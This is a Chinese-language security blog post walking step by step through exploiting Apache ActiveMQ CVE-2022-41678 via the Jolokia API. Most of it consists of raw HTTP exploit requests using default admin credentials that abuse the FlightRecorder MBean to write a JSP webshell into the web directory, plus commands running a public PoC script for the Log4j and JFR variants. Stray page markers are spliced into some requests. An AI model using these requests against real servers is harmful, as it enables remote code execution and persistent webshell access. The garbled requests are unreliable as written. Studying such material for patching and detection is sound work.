#  Apache ActiveMQ Jolokia 后台 RCE (CVE-2022-41678) 漏洞说明  
原创 晨星安全团队
                    晨星安全团队  晨星安全团队   2026-01-19 02:18  
  
# Apache ActiveMQ Jolokia后台RCE（CVE-2022-41678）  
  
Apache ActiveMQ 在 5.16.5, 5.17.3 版本及以前，后台 Jolokia 存在一处任意文件写入导致的远程代码执行漏洞  
  
首先，访问 /api/jolokia/list  
 这个 API 可以查看当前服务器里所有的 MBeans  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzr7xuKDYpLicfJjI5ibb7Ypv34kvRueNnDWdh4UojQXia9b2FH33eCuiaxdw/640?wx_fmt=png&from=appmsg "")  
  
这其中有两个可以被用来执行任意代码  
```
GET /api/jolokia/list HTTP/1.1Host: localhost:8161Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0Authorization: Basic YWRtaW46YWRtaW4=Origin: http://localhost
```  
  
主要问题出在 FlightRecorder  
 这个 Mbean，功能是记录内存，gc，调用栈等，漏洞用到的方法主要是以下几个  
- newRecording  
  
新建记录  
  
- setConfiguration  
  
更改配置  
  
- startRecording  
  
开始录制  
  
- stopRecording  
  
结束录制  
  
- copyTo  
  
导出录制文件  
  
漏洞思路是通过 setConfiguration 修改配置，把一些键名改成 JSP 代码，记录的数据就会包含该 JSP 代码，录制完成后，通过 copyTo 导出到 Web 目录即可  
  
调用setPredefinedConfiguration，断点停下来后可以拿到默认的配置，先保存下来  
```
POST /api/jolokia/ HTTP/1.1Host: localhost:8161Origin:localhost:8161Authorization: Basic YWRtaW46YWRtaW4=Connection: closeContent-Type: application/jsonContent-Length: 155{"type": "EXEC","mbean": "jdk.management.jfr:type=FlightRecorder","operation": "setPredefinedConfiguration","arguments": [1,"s"]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzrDWDDiahlLYAUNSD8UJKkRCQm8rUHuUkiaTjvCCRhNwGGQJesTm3gmkNw/640?wx_fmt=png&from=appmsg "")  
## 新建记录  
```
记录的 id 为 1，后面 POC 都要使用这个 idPOST /api/jolokia/ HTTP/1.1Host: localhost:8161Origin:localhost:8161Authorization: Basic YWRtaW46YWRtaW4=Connection: close1-3.md 2025-09-053 / 7Content-Type: application/jsonContent-Length: 136{"type": "EXEC","mbean": "jdk.management.jfr:type=FlightRecorder","operation": "newRecording","arguments": []}
```  
## 更改配置  
  
将默认配置的如下处改为 JSP 代码，特殊字符需要实体编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzr3TlFXkRebyVb29AWUngiauXRSDa5Woepicat8WrU7cQB5Yvs5aCiaWAHA/640?wx_fmt=png&from=appmsg "")  
  
如下 arguments 的第一位参数是记录 id，第二个参数是配置内容（很长，已省略）  
```
POST /api/jolokia/ HTTP/1.1Host: localhost:8161Origin:localhost:8161Authorization: Basic YWRtaW46YWRtaW4=Connection: closeContent-Type: application/jsonContent-Length: 31263{"type": "EXEC","mbean": "jdk.management.jfr:type=FlightRecorder","operation": "setConfiguration","arguments": [1,"..."]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzrF58PxlXOLoWDrDPxNG567KnzpByXWwQDCgDPV9hcNib26eH5PsjpU6Q/640?wx_fmt=png&from=appmsg "")  
## 开始录制  
```
POST /api/jolokia/ HTTP/1.1Host: localhost:8161Origin:localhost:8161Authorization: Basic YWRtaW46YWRtaW4=Connection: closeContent-Type: application/jsonContent-Length: 141{"type": "EXEC","mbean": "jdk.management.jfr:type=FlightRecorder","operation": "startRecording","arguments": [1]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzribK1ZiasfBv7koic2QXibF6XKQUI0SLXx9VIbYgyyJP3TQPNuD66FexEgw/640?wx_fmt=png&from=appmsg "")  
## 结束录制  
```
POST /api/jolokia/ HTTP/1.1Host: localhost:8161Origin:localhost:81611-3.md 2025-09-055 / 7Authorization: Basic YWRtaW46YWRtaW4=Connection: closeContent-Type: application/jsonContent-Length: 138{"type": "EXEC","mbean": "jdk.management.jfr:type=FlightRecorder","operation": "stopRecording","arguments": [1]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzrboY3VoYNg0Nx09GFYZD5f82zdkdjS9scxByknmhGZMUNENALibs6WNQ/640?wx_fmt=png&from=appmsg "")  
  
导出到 web 目录  
```
POST /api/jolokia/ HTTP/1.1Host: localhost:8161Origin:localhost:8161Authorization: Basic YWRtaW46YWRtaW4=Connection: closeContent-Type: application/jsonContent-Length: 159{"type": "EXEC","mbean": "jdk.management.jfr:type=FlightRecorder","operation": "copyTo","arguments": [1,"../webapps/admin/test.jsp"]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzrAE9sAlRDGYIcdGQ3nMXicry1sGKYhV4xYXKHL4CLeyaNwrtmASicEbmQ/640?wx_fmt=png&from=appmsg "")  
  
访问 WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzr8Bq4V4ibJhHMmVU2kPojcHQp1V8b6BjPdW3hLFwd9W9p5KgF2RlictfA/640?wx_fmt=png&from=appmsg "")  
  
**第一个方法是使用 org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean，这是由 Log4j2 提 供的一个MBean**  
  
**这个方法受到 ActiveMQ 版本的限制，因为 Log4j2 是在 5.17.0 中才引入 Apache ActiveMQ**  
  
**攻击者使用这个 MBean 中的 setConfigText 操作可以更改 Log4j 的配置，进而将日志文件写入任意目录中**  
  
下载脚本  
  
https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py  
```
python3 CVE-2022-41678.py -u admin -p admin http://127.0.0.1:8161
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzrumjbYFMMz9lKib5DsTTKYnsRXRJqAWWo3HlqDIod1VezWib9ibUGXN6QA/640?wx_fmt=png&from=appmsg "")  
  
Webshell 被写入在 /admin/shell.jsp  
 文件中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzr4iag0icVVImcdOUkg3COqBsu71H3044PEWbn50VdvISWhOicmNd69ncmQ/640?wx_fmt=png&from=appmsg "")  
  
**第二个可利用的 Mbean 是 jdk.management.jfr.FlightRecorderMXBean。**  
  
**FlightRecorder 是在 OpenJDK 11 中引入的特性，被用于记录 Java 虚拟机的运行事件。利用这个功能，攻击 者可以将事件日志写入任意文件**  
```
python3 CVE-2022-41678.py -u admin -p admin --exploit jfr http://127.0.0.1:8161
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZmKm0AyS52iceX9EClcYVbzrtYkSSzrrqVBLicwB3hLcVgG5LGFibXsZxa4lYG7lclWS1AiasE5P0piakA/640?wx_fmt=png&from=appmsg "")  
  
作者：晨星安全团队——雾島风起時  
  
